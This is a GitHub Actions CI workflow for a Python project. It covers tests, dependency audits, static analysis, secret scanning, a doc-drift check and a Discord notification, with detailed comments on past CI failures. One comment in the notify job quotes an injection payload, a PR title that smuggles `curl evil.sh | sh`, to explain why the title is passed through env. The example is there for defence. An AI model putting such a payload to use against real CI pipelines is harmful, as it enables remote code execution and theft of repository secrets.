name: CI

# Previously this ran only on main. Nearly all work lands via PRs into develop,
# so for months the workflow simply never ran for any of it — which is how CI
# stayed red from 2026-06-25 onward without anyone noticing (DG-179). Watching
# develop is the part that makes the rest of this file worth having.
on:
  push:
    branches: ["main", "develop"]
  pull_request:
    branches: ["main", "develop"]

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: read
  # `contents: read` alone is not enough for the secret scan. Declaring a
  # `permissions:` block sets every scope not listed here to `none`, and on a
  # `pull_request` event gitleaks-action takes its `ScanPullRequest` path, which
  # asks the API which commits are in the PR. GitHub answers that call 403
  # without this, and names the scope it wants in the response:
  # `x-accepted-github-permissions: pull_requests=read`.
  #
  # Nothing here changed when it broke (DG-323): this block dates to 2026-08-06,
  # the action's `v2` tag has pointed at the same commit since 2025-04-17, and
  # the identical job logged `no leaks found` on 2026-08-29. The endpoint's
  # requirement changed underneath. Read-only, and only what that one call needs.
  pull-requests: read

jobs:
  # GitHub filters paths per *workflow*, not per job, so the obvious
  # `paths-ignore: ["**.md"]` would also switch off the secret scan and the
  # documentation-drift check -- the two checks that most need to run when the
  # change is markdown. This job answers the narrower question instead, and the
  # jobs that only care about Python read the answer.
  changes:
    name: what changed
    runs-on: ubuntu-latest
    outputs:
      code: ${{ steps.probe.outputs.code }}
    steps:
      - uses: actions/checkout@v4
        with:
          # The diff needs both ends of the range present.
          fetch-depth: 0

      - id: probe
        env:
          BASE: ${{ github.event_name == 'pull_request' && github.event.pull_request.base.sha || github.event.before }}
        run: |
          # Fails open, deliberately. A new branch reports an all-zero `before`
          # and a force-push can name a commit that is no longer reachable; in
          # either case the honest answer is "unknown", and a silent skip is the
          # failure mode this repo has been bitten by before. Unknown runs
          # everything.
          if [ -z "$BASE" ] \
             || [ "$BASE" = "0000000000000000000000000000000000000000" ] \
             || ! git cat-file -e "$BASE^{commit}" 2>/dev/null; then
            echo "code=true" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          # Anything that is not markdown counts as code, including this
          # workflow, pyproject.toml and the lockfile.
          #
          # Counted rather than tested with `grep -qv`. That spelling reads
          # correctly and is wrong: BSD grep returns 1 when a non-matching line
          # exists and 0 on empty input -- exactly inverted -- so the same file
          # would have been gated one way on a maintainer's Mac and the other
          # way on the GNU grep in CI. `-cv` means the same thing on both.
          # The trailing `|| true` is load-bearing: grep exits 1 when the count
          # is zero, which under `set -e` would kill the step.
          non_md=$(git diff --name-only "$BASE" "$GITHUB_SHA" | grep -cv '\.md$' || true)
          if [ "$non_md" -gt 0 ]; then
            echo "code=true" >> "$GITHUB_OUTPUT"
          else
            echo "code=false" >> "$GITHUB_OUTPUT"
          fi

  test:
    name: test (py${{ matrix.python-version }})
    runs-on: ubuntu-latest
    needs: changes
    if: needs.changes.outputs.code == 'true'
    strategy:
      fail-fast: false
      matrix:
        # 3.10 is the floor declared in pyproject and was never actually
        # exercised until now; 3.13 is what the maintainers run.
        python-version: ["3.10", "3.13"]

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}
          cache: pip

      # Installing from pyproject rather than requirements-dev.txt is the whole
      # fix for the second failure: that file is hand-maintained, had drifted,
      # and was missing pytest-asyncio, so 38 async tests failed with "async def
      # function and no async plugin installed". One source of truth.
      - name: Install
        run: |
          python -m pip install --upgrade pip
          pip install -e ".[dev]"

      - name: Lint
        run: |
          ruff check src tests scripts
          ruff format --check src tests

      - name: Types
        run: mypy src

      - name: Tests
        run: pytest

  # No `needs: changes` gate here on purpose. gitleaks scans markdown as
  # readily as Python, and check_doc_drift.py exists precisely for documentation
  # changes. This job runs on every push and every pull request.
  security:
    name: security
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          # Full history, for the `push` half of this job: there, gitleaks scans
          # the checkout and needs past commits, not just the tip.
          #
          # It buys nothing on a `pull_request` event, and the comment used to
          # claim otherwise. There the action calls the API for the PR's commit
          # list and never reads this checkout, so a PR is scanned over its own
          # commits only. Making a PR scan full history would mean dropping
          # `ScanPullRequest` and driving the gitleaks CLI directly -- a larger
          # change than DG-323, recorded here rather than done quietly.
          fetch-depth: 0

      - uses: actions/setup-python@v5
        with:
          python-version: "3.13"
          cache: pip

      # uv is here to export uv.lock for the audit below, not to install the
      # project. bandit reads source, and pip-audit reads a requirements file --
      # installing drunken-guild itself would only add a package that is not on
      # PyPI, so --strict would fail on its own unauditable package.
      - name: Install
        run: |
          python -m pip install --upgrade pip
          pip install bandit pip-audit uv

      # Known CVEs, failing the build rather than warning: this is a tool other
      # people install and point at their credentials.
      #
      # Two audits, because there are two environments and they do not hold the
      # same versions. The comment here used to claim that auditing
      # requirements-dev.txt "audits what actually gets installed", which was
      # simply untrue: the Dockerfile installs from uv.lock, and on 2026-08-23
      # uv.lock pinned cryptography 49.0.0 -- inside a high-severity advisory --
      # while requirements-dev.txt held 50.0.0 and reported clean. The audit was
      # answering about an environment nobody ships (DG-289).
      #
      # The shipped one comes first: if only one of these can be believed, it is
      # the one describing what a user installs.
      - name: Dependency audit — what ships (uv.lock)
        run: |
          uv export --format requirements-txt --no-emit-project --no-dev \
            > /tmp/shipped-requirements.txt
          pip-audit --strict --progress-spinner off -r /tmp/shipped-requirements.txt

      - name: Dependency audit — the dev environment
        run: pip-audit --strict --progress-spinner off -r requirements-dev.txt

      # Static analysis, gated at MEDIUM and above — a real bar rather than a
      # decorative one. The three MEDIUM findings this repo had (B310,
      # unrestricted urlopen schemes) were fixed by routing every outbound call
      # through core.http, not by suppressing them. The remaining LOW findings
      # are try/except/pass style in service/, tracked rather than silently
      # ignored.
      # `src` and `scripts` both, because `pyproject.toml` ships both:
      # `packages = ["scripts", "core", ...]`. Scanning `src` alone left a whole
      # tree of shipped code unscanned, and it held three HIGH-confidence
      # findings — two of them `urlopen` calls that bypassed the scheme guard
      # core/http.py exists to be (DG-325).
      - name: Static analysis
        run: bandit -r src scripts -ll

      # Secret scanning across the full history. Test fixtures that deliberately
      # look like credentials carry an explicit marker, allowlisted in
      # .gitleaks.toml.
      # Pinned to the commit `v2` currently resolves to, not to the tag. A
      # moving tag on a security gate is silent drift, which is the failure
      # class this repository exists to remove -- and a gate is the worst place
      # to keep one. `v2` has in fact been stable since 2025-04-17; this removes
      # the possibility, not an observed problem.
      - name: Secret scan
        uses: gitleaks/gitleaks-action@ff98106e4c7b2bc287b24eaf42907196329070c7 # v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          GITLEAKS_CONFIG: .gitleaks.toml

      # DG-238 was a manual sweep of 34 stale references, needed because
      # --workspace stayed advertised in the README for two releases after it
      # was deleted. A sweep has a shelf life; this does not. Deliberately a
      # grep list rather than a real doc-vs-code checker — the discipline it
      # needs is small: the PR that removes something adds its name.
      #
      # `if: always()` because these two are independent gates that happen to
      # share a job. When the secret scan crashed on 2026-09-07 this was skipped
      # with it, and CLAUDE.md says both run on every push -- coupling them by
      # step order was an accident of ordering, not a decision.
      - name: Documentation drift
        if: always()
        run: python scripts/check_doc_drift.py

      # The operator's project ids stay out of this public repository (DG-317).
      # The local commit hooks cover commits made on a machine with the
      # registry; this covers every other way in — another machine, GitHub's
      # "Update branch". The ids come from a secret because the repository must
      # not hold them, and --require-ids fails an unset secret rather than
      # reporting an unchecked run as clean. Output names places, never ids.
      - name: Operator project inventory
        if: always()
        env:
          OPERATOR_PROJECT_IDS: ${{ secrets.OPERATOR_PROJECT_IDS }}
          RANGE: ${{ github.event_name == 'pull_request' && format('{0}..{1}', github.event.pull_request.base.sha, github.event.pull_request.head.sha) || format('{0}..{1}', github.event.before, github.sha) }}
        run: |
          # A new branch reports an all-zero `before`; then the tree is checked
          # and the messages of the tip commit alone.
          case "$RANGE" in 0000000000000000000000000000000000000000..*) RANGE="${RANGE#*..}~1..${RANGE#*..}" ;; esac
          python scripts/check_operator_inventory.py --tree --messages "$RANGE" --require-ids

  clean-install:
    name: clean install
    runs-on: ubuntu-latest
    needs: changes
    if: needs.changes.outputs.code == 'true'
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.13"

      - uses: astral-sh/setup-uv@v5

      # Proves what the unit tests structurally cannot: that someone who is not
      # us, with no .env and no config anywhere, can install this and reach a
      # working, safe setup. Every failure in MCP-ARCHITECTURE.md §1 was
      # invisible on an already-configured machine.
      - name: Clean-room verification
        run: ./scripts/verify_clean_install.sh

  # The other half of DG-355: Discord stopped being somewhere to answer and
  # became somewhere to be told. This is the "PR is ready" half of that, sent
  # from CI rather than from a daemon watching a socket.
  #
  # Deliberately `needs` every gate and `if: success()`. A notification saying a
  # PR is ready for review, sent while its tests are red, trains the reader to
  # ignore the next one.
  #
  # `continue-on-error` because a notification is never worth failing a build
  # over — and `core.notify` exits 0 with its reason on stderr in any case, so
  # an unset DISCORD_WEBHOOK_URL logs "not sent" rather than breaking a fork's
  # CI, which cannot see repository secrets at all.
  notify:
    name: notify
    runs-on: ubuntu-latest
    needs: [changes, test, security, clean-install]
    # Not `success()`: a docs-only pull request *skips* the three code gates,
    # and a skipped dependency is not a successful one — the notification would
    # silently never be sent for exactly the changes that most want reviewing.
    # This says "nothing failed" instead, which is the actual condition.
    if: >-
      github.event_name == 'pull_request' && !cancelled()
      && !contains(needs.*.result, 'failure')
    continue-on-error: true
    steps:
      - uses: actions/checkout@v4
      - uses: astral-sh/setup-uv@v5
      - uses: actions/setup-python@v5
        with:
          python-version: "3.13"

      # The title and URL arrive through `env`, never interpolated into the
      # script. `${{ }}` is substituted before the shell sees the line, so a
      # pull request titled `"; curl evil.sh | sh; #` would run as this job —
      # with the repository's secrets in its environment. Anyone can open a
      # pull request; that makes the title attacker-controlled input.
      - name: Say the PR is ready
        env:
          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
          DRUNKEN_DISCORD_WEBHOOK: env://DISCORD_WEBHOOK_URL
          PR_TITLE: ${{ github.event.pull_request.title }}
          PR_URL: ${{ github.event.pull_request.html_url }}
        run: |
          uv run python -m core.notify \
            "$PR_TITLE — checks green, ready for review" --link "$PR_URL"
